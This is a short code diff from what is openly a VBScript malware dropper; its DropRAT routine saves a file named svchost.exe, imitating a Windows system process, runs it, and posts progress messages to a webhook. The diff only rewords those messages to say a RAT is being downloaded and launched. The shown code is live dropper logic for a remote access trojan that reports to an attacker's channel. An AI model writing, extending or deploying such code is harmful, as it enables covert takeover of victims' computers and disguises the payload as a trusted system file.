@@ -58,7 +58,7 @@ Sub DropRAT(targetWH, sendRocket)
     Dim op : op = tPath & "\svchost.exe"
     
     If sendRocket Then
-        Call PostEmbedTo(":rocket: Agent Download Initiated", "Fetching secondary payload...", 10181046, targetWH)
+        Call PostEmbedTo(":rocket: Agent Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
     End If
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
@@ -68,7 +68,7 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 100000 Then
-            If sendRocket Then Call PostEmbedTo(":white_check_mark: Agent Dropped", "Executing secondary payload.", 10181046, targetWH)
+            If sendRocket Then Call PostEmbedTo(":white_check_mark: Rat Launched", "Rat Launched", 10181046, targetWH)
             Call RunCmd("""" & op & """")
         End If
     End If
